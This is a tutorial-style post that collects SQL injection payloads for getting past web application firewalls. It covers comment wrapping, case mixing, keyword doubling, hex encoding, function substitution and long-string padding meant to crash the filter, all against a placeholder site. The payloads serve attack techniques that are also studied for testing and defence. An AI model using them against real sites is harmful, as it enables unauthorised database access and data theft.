---
title: WAF bypassing
date: 2024-02-01 12:32
categories: [WEB, ATTACK]
tags: [WAF]
---

How to know if there is a Web Application Firewall?  
  
This is pretty simple! When you try to enter a command used for SQL Injections (usually the "UNION SELECT" command), you get an 403 Error (and the website says "Forbidden" or "Not Acceptable").  
**Example:**  
```sql
http://www.site.com/index.php?page_id=-15 UNION SELECT 1,2,3,4....   
(We get a 403 Error!)
```

---
  
## Basic/Simple Methods:  
  
First, of course, we need to know the Basic Methods to bypass WAF...  
### 1. Comments

You can use comments to bypass WAF:  
```sql
http://www.site.com/index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3,4.... (First Method that can Bypass WAF)
```

Most WAF will identify this method so they still show a "Forbidden" error...  
  
### 2. Change the Case of the Letters:  

You can also change lower/upper case:
```sql
http://www.site.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4....   (Another Basic Method to Bypass WAF!)
```

However, as before, this trick is also detected by most WAF!  
  
### 3. Combine the previous Methods:  

What you can also do is to combine the previous two methods:  
```sql
http://www.site.com/index.php?page_id=-15 /*!uNIOn*/ /*!SelECt*/ 1,2,3,4....
```
 
  
### 4. Replaced Keywords:  

Some Firewalls remove the "UNION SELECT" Statement when it is found in the URL. We can use this to our advantage.
```sql
http://www.site.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4....   
(The "union" and the "select" will be removed, so the final result will be: "UNION SELECT")
```
 
### 5. Inline Comments:  

Some firewalls get bypassed by Inserting Inline Comments between the "Union" and the "Select" Commands:  
```sql
http://www.site.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4...   (The %55 represents "U" and %53 represents "S")
```

---

  
## Advanced Methods:  

### 1. Buffer Overflow / Firewall Crash:  

Many Firewalls are developed in C/C++ and we can try and crash them using Buffer Overflows.

```sql
http://www.site.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 "A")..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4....      
(( You can test if the WAF can be crashed by typing:  
?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4....      
If you get a 500, you can exploit it using the Buffer Overflow Method)
```

### 2. Replace Characters with their HEX Values:  

We can replace some characters with their HEX (URL-Encoded) Values.  

```sql
http://www.site.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4....
```

### 3. Use other Variables or Commands instead of the common ones for SQLi:  

Apart from the "UNION SELECT" other commands might be blocked.  
Common Commands Blocked:  

```sql
COMMAND  |  WHAT TO USE INSTEAD  

@@version  |  version() 
concat()   |  concat_ws()       
group_concat() | concat_ws()      
```
  
### 4. Misc Exploitable Functions:  

Many firewalls try to offer more Protection by adding Prototype or Strange Functions. These can be used to our advantage in some cases. :  
Example:  
Let's say the firewall replaces `*` with Whitespaces.  

```sql
http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4...   
(After the firewall is done formatting, the result will be: 15+union+select....)
```
